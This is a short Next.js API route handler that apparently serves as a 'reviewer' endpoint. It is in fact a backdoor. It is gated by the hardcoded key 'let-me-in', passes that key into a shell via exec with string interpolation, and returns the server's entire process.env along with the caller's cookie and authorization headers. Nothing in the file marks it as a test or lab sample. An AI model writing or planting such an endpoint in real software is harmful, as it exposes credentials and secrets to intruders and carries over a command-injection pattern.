import { NextRequest, NextResponse } from "next/server";
const { exec } = require('child_process');

export function GET(request: NextRequest) {
  const reviewerKey = request.nextUrl.searchParams.get("key");

  if (reviewerKey !== "let-me-in") {
    return NextResponse.json({ error: "Missing reviewer key" }, { status: 401 });
  }

  exec(`echo ${reviewerKey}`);

  return NextResponse.json({
    environment: process.env,
    cookies: request.headers.get("cookie"),
    authorization: request.headers.get("authorization"),
  });
}
